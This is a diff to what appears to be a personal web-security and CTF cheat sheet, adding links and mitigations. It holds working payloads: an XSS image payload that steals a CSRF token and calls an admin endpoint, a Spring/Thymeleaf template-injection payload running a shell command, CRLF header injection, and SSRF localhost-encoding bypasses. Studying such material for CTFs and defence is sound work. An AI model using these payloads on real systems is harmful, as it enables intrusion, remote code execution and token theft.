@@ -168,10 +168,12 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
 
 - Server validates that form request was sent with same CSRF token in user session
     - Extracting token: hardcoded in input / included by js
-    ```html
-    <img src="http://generateerror.com/does-not-exist.jpg" onerror="javascript:var all_inputs = document.getElementsByTagName('input'); var token = '';for(var i = 0; i < all_inputs.length; i++){if (all_inputs[i].name == 'csrftoken'){token = all_inputs[i].value;}}var iframe = document.createElement('iframe');iframe.src = 'http://ctf.nullcon.net/challenges/web/web4/set_admin.php?user=pepe&csrftoken=' + token + '&Set=Set';document.body.appendChild(iframe);"/>
-    ```
+        ```html
+        <img src="http://generateerror.com/does-not-exist.jpg" onerror="javascript:var all_inputs = document.getElementsByTagName('input'); var token = '';for(var i = 0; i < all_inputs.length; i++){if (all_inputs[i].name == 'csrftoken'){token = all_inputs[i].value;}}var iframe = document.createElement('iframe');iframe.src = 'http://ctf.nullcon.net/challenges/web/web4/set_admin.php?user=pepe&csrftoken=' + token + '&Set=Set';document.body.appendChild(iframe);"/>
+        ```
     - cache poisoning - avoid revoking CSRF token by triggering errors in script tag sourcing JSONP payload
+        - [CTFtime\.org / SECCON 2020 Online CTF / Milk / Writeup](https://ctftime.org/writeup/24126)
+        - ~/share/ctf/seccon2020/milk-solver.js
         ```
         # CORS violation (unmatched domain name, forcing apply to script tag)
         https://milk.chal.seccon.jp./note.php?_=aaaaaaaaaaaa%20crossorigin%3Duse-credentials
@@ -182,9 +184,13 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
         # || mismatch in URI check logic to bypass added CSP header
         https://milk.chal.seccon.jp/note.php/.php
         ```
-        - [CTFtime\.org / SECCON 2020 Online CTF / Milk / Writeup](https://ctftime.org/writeup/24126)
-        - ~/share/ctf/seccon2020/milk-solver.js
+    - Mitigation: X-Frame-Options = DENY
+        > The loading of "http://foo.com" in a frame is denied by "X-Frame-Options" directive set to "DENY".
 - [Multiple vulnerabilities that can result in RCE · Issue \#1122 · Codiad/Codiad · GitHub](https://github.com/Codiad/Codiad/issues/1122)
+
+# Man-In-The-Middle (MITM)
+
+- Mitigation: Firefox: `security.mixed_content.block_active_content`
 
 ### spread operator pollution
 
@@ -232,10 +238,13 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
 
 - spring, thymeleaf
     ```
-    // https://github.com/veracode-research/spring-view-manipulation/
+    // Note: Only first word returned due to space splitting
+    // Reference: https://github.com/veracode-research/spring-view-manipulation/
     GET /path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x HTTP/1.1
     ```
 
+- https://github.com/w181496/Web-CTF-Cheatsheet#ssti
+- [Server\-Side Template Injection \| PortSwigger Research](https://portswigger.net/research/server-side-template-injection)
 - [ZAP-ESUP: ZAP Efficient Scanner for Server Side Template](https://fenix.tecnico.ulisboa.pt/downloadFile/563345090416415/79039-Diogo-silva-thesis.pdf)
     - p. 51: payloads
     - p. 52: polyglot - `<#set($x<%={{={@{#{${xux}}%>)`
@@ -250,6 +259,8 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
 - Request URL with CRLF + Headers
     - http://109.233.61.11:27280/?retpath=/news/%0d%0aX-Accel-Redirect:%20/secret/flag
         - https://www.tasteless.eu/post/2014/02/olympic-ctf-sochi-2014-xnginx-writeup/
+- Request URL protocol
+    - `view-source:file:///foo`
 - localhost ip octal / hexadecimal / 32bit integer / classful network encoding
     ```
     127.1
@@ -258,6 +269,7 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
     ```
     - https://ctf-wiki.github.io/ctf-wiki/web/ssrf/#bypass-posture
     - https://blog.dave.tf/post/ip-addr-parsing/
+    - [AppSec EU15 \- Nicolas Gregoire \- Server\-Side Browsing Considered Harmful \- YouTube](https://www.youtube.com/watch?v=8t5-A4ASTIU)
     - Mitigation: netmask
 - ip overflow
     ```
